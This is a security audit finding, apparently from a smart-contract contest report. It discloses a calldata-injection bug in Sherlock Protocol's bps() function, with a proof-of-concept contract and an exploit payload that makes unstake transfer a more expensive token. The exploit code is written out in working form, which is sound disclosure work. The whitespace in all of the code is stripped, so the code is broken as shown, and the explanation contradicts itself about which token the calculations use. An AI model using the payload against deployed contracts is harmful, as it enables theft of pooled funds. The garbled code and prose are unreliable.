[H-02] [Bug] A critical bug inbpsfunction
Submitted by hrkrshnn, also found by jonah1005 and walker
functionbps()internalpurereturns(IERC20rt) {// These fields are not accessible from assemblybytesmemoryarray=msg.data;uint256index=msg.data.length;// solhint-disable-next-line no-inline-assemblyassembly{// Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.rt :=and(mload(add(array,index)),0xffffffffffffffffffffffffffffffffffffffff)}}
The above function is designed to expect the token at the end ofcalldata, but a malicious user can inject extra values at the end ofcalldataand fake return values.
The following contract demonstrates an example:
pragmasolidity0.8.6;interfaceIERC20{}errorStaticCallFailed();contractBadEncoding{/// Will return address(1). But address(0) is expected!functionf()externalviewreturns(address) {addressactual=address(0);addressinjected=address(1);(boolsuccess,bytesmemoryret) =address(this).staticcall(abi.encodeWithSelector(this.g.selector,actual,injected));if(!success)revertStaticCallFailed();returnabi.decode(ret, (address));}functiong(IERC20_token)externalpurereturns(IERC20) {// to get rid of the unused warning_token;// Does it always match _token?returnbps();}// From Sherlock Protocol: PoolBase.solfunctionbps()internalpurereturns(IERC20rt) {// These fields are not accessible from assemblybytesmemoryarray=msg.data;uint256index=msg.data.length;// solhint-disable-next-line no-inline-assemblyassembly{// Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.rt :=and(mload(add(array,index)),0xffffffffffffffffffffffffffffffffffffffff)}}}
This example can be used to exploit the protocol:
functionunstake(uint256_id,address_receiver,IERC20_token)externaloverridereturns(uint256amount) {PoolStorage.Basestorageps=baseData();require(_receiver!=address(0),'RECEIVER');GovStorage.Basestoragegs=GovStorage.gs();PoolStorage.UnstakeEntrymemorywithdraw=ps.unstakeEntries[msg.sender][_id];require(withdraw.blockInitiated!=0,'WITHDRAW_NOT_ACTIVE');// period is includingrequire(withdraw.blockInitiated+gs.unstakeCooldown<uint40(block.number),'COOLDOWN_ACTIVE');require(withdraw.blockInitiated+gs.unstakeCooldown+gs.unstakeWindow>=uint40(block.number),'UNSTAKE_WINDOW_EXPIRED');amount=withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());ps.stakeBalance=ps.stakeBalance.sub(amount);deleteps.unstakeEntries[msg.sender][_id];ps.lockToken.burn(address(this),withdraw.lock);_token.safeTransfer(_receiver,amount);}
State tokenToken1. Let’s say there is a more expensive tokenToken2.
Here’s an example exploit:
bytesmemoryexploitPayload=abi.encodeWithSignature(PoolBase.unstake.selector,(uint256(_id),address(_receiver),address(Token2),address(Token1)));poolAddress.call(exploitPayload);
All the calculations onpswould be done onToken2, but at the end, because of,_token.safeTransfer(_receiver, amount);,Token2would be transferred. Assuming thatToken2is more expensive thanToken1, the attacker makes a profit.
Similarly, the same technique can be used at a lot of other places. Even if this exploit is not profitable, the fact that the computations can be done on two different tokens is buggy.
There are several other places where the same pattern is used. All of them needs to be fixed. I’ve not written an exhaustive list.
Evert0x (Sherlock) confirmed